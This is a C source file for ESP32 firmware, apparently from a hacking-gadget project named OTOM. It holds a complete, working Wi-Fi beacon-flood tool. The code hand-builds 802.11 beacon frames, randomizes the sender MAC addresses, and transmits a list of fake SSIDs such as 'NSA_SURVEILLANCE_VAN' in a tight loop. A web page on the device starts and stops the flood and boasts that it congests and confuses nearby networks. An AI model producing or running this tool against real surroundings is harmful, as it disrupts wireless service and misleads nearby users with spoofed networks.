#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "main.h"
#include "esp_http_server.h"
#include "beacon_spam.h"
#include "esp_random.h"

static const char *TAG = "OTOM_BEACON";

// Fake SSIDs list
const char *fake_ssids[] = {
    "OTOM_1", "OTOM_2", "OTOM_FREE_WIFI", "OTOM_HACKED",
    "PROMEGAIJIN", "RA_PROTOCOL", "SILENT_ARCHIVES",
    "NSA_SURVEILLANCE_VAN", "COFFEE_SHOP_1337",
    "INTERNET_IS_FREE", "CYBER_HEROES", "H4CK3D",
    "GODMODE", "AI_SKYNET", "L33T_NETWORK", "PHANTOM_WIFI",
    "IBDAA_HAX", "NISUTMED", "ANONYMOUS_ACCESS",
    "ESP32_RULEZ", "YAZZLANDER_NET", "CAPTURE_THE_FLAG"
};
int ssid_count = sizeof(fake_ssids) / sizeof(fake_ssids[0]);

// Beacon frame template (up to SSID tag)
uint8_t beacon_frame_header[] = {
    0x80, 0x00,                         // Type/Subtype: Beacon
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source (fake MAC, overwritten)
    0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // BSSID (same as source)
    0x00, 0x00,                         // Sequence / fragment
    0x00, 0x00, 0x00, 0x00,             // Timestamp (part 1)
    0x00, 0x00, 0x00, 0x00,             // Timestamp (part 2)
    0x64, 0x00,                         // Beacon interval
    0x31, 0x04,                         // Capabilities
    0x00                                // SSID tag number
};

// Supported rates (fixed part after SSID)
uint8_t beacon_frame_tail[] = {
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, // Supported rates
    0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01, 0x01                    // DS Parameter set (channel 1)
};

// Task handle guard with mutex
static TaskHandle_t spam_task_handle = NULL;
static SemaphoreHandle_t task_mutex = NULL;

// Random MAC generator
static void random_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)(esp_random() & 0xFF);
    }
    mac[0] &= 0xFE;  // unicast
    mac[0] |= 0x02;  // locally administered
}

void beacon_spam_task(void *pvParameter) {
    ESP_LOGW(TAG, "Beacon spam started (runs until stopped)");

    while (1) {
        for (int i = 0; i < ssid_count; i++) {
            const char *ssid = fake_ssids[i];
            int ssid_len = strlen(ssid);

            uint8_t frame[256];
            int pos = 0;

            // Copy header
            memcpy(frame, beacon_frame_header, sizeof(beacon_frame_header));
            pos = sizeof(beacon_frame_header);

            // Insert SSID length + SSID
            frame[pos++] = ssid_len;
            memcpy(&frame[pos], ssid, ssid_len);
            pos += ssid_len;

            // Append the rest of the IEs
            memcpy(&frame[pos], beacon_frame_tail, sizeof(beacon_frame_tail));
            pos += sizeof(beacon_frame_tail);

            // Randomize MACs
            uint8_t mac[6];
            random_mac(mac);
            memcpy(&frame[10], mac, 6);  // source
            memcpy(&frame[16], mac, 6);  // BSSID

            // Transmit via STA interface
            esp_wifi_80211_tx(WIFI_IF_STA, frame, pos, false);

            vTaskDelay(1 / portTICK_PERIOD_MS); // high frequency
        }
    }
}

void beacon_spam_stop(void) {
    if (task_mutex == NULL) {
        task_mutex = xSemaphoreCreateMutex();
    }
    
    xSemaphoreTake(task_mutex, portMAX_DELAY);
    
    if (spam_task_handle != NULL) {
        vTaskDelete(spam_task_handle);
        spam_task_handle = NULL;
        ESP_LOGI(TAG, "Beacon spam stopped");
    } else {
        ESP_LOGW(TAG, "Beacon spam not running");
    }
    
    xSemaphoreGive(task_mutex);
}

// HTTP handler - starts the spam when button pressed
esp_err_t wifi_beacon_handler(httpd_req_t *req) {
    if (task_mutex == NULL) {
        task_mutex = xSemaphoreCreateMutex();
    }
    
    // Check for stop command
    char query[64];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            beacon_spam_stop();
            
            const char *resp =
                "<!DOCTYPE html><html><head><title>Beacon Flood Stopped</title>"
                "<meta http-equiv='refresh' content='2;url=/wifi_beacon'>"
                "</head>"
                "<body style='background:#0a0f1c;color:#f5c542;font-family:sans-serif;text-align:center;padding:20px;'>"
                "<h1>âœ… Beacon Flood Stopped</h1>"
                "<p>Redirecting...</p>"
                "</body></html>";
            
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
    }
    
    xSemaphoreTake(task_mutex, portMAX_DELAY);
    bool is_running = (spam_task_handle != NULL);
    xSemaphoreGive(task_mutex);

	if (is_running) {
			const char *resp =
				"<!DOCTYPE html><html><head><title>Beacon Flood</title></head>"
				"<body style='background:#0a0f1c;color:#f5c542;font-family:sans-serif;padding:20px;'>"
				"<div style='max-width:600px;margin:0 auto;'>"
				"<h1 style='text-align:center;'>&#128680; Beacon Flood Active</h1>"
				"<div style='background:#ff4444;color:white;padding:15px;border-radius:8px;text-align:center;font-weight:bold;margin:20px 0;'>"
				"&#128308; BROADCASTING FAKE NETWORKS"
				"</div>"
				"<div style='background:#1a1f2c;padding:15px;border-radius:8px;margin:20px 0;'>"
				"<p>&#128161; The ESP32 is now flooding the airwaves with %d fake SSIDs.</p>"
				"<p>&#9888; This creates network congestion and confusion for WiFi scanners.</p>"
				"</div>"
				"<div style='text-align:center;'>"
				"<a href='/wifi_beacon?stop=1' style='display:inline-block;padding:12px 20px;margin:10px;background:#ff4444;color:white;text-decoration:none;font-weight:bold;border-radius:8px;'>&#9209; Stop Beacon Flood</a>"
				"</div>"
				"<div style='text-align:center;margin-top:30px;'>"
				"<a href='/' style='display:inline-block;padding:12px 20px;background:#f5c542;color:#0a0f1c;text-decoration:none;font-weight:bold;border-radius:8px;'>&#8592; Back to Main Menu</a>"
				"</div>"
				"</div>"
				"</body></html>";

			char response[2048];
			snprintf(response, sizeof(response), resp, ssid_count);
			httpd_resp_set_type(req, "text/html");
			httpd_resp_send(req, response, strlen(response));
			return ESP_OK;
	}
    
    // Start beacon spam
    xSemaphoreTake(task_mutex, portMAX_DELAY);
    
    if (spam_task_handle == NULL) {
        xTaskCreate(&beacon_spam_task, "beacon_spam_task", 4096, NULL, 5, &spam_task_handle);

        const char *resp =
            "<!DOCTYPE html><html><head><title>Beacon Flood Started</title>"
            "<meta http-equiv='refresh' content='2;url=/wifi_beacon'>"
            "</head>"
            "<body style='background:#0a0f1c;color:#f5c542;font-family:sans-serif;text-align:center;padding:20px;'>"
            "<h1>ðŸšØ Beacon Flood Started</h1>"
            "<p>OTOM is now broadcasting fake networks.</p>"
            "<p>Redirecting...</p>"
            "</body></html>";

        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, resp, strlen(resp));

        ESP_LOGI(TAG, "Beacon flood triggered via web");
    }
    
    xSemaphoreGive(task_mutex);
    return ESP_OK;
}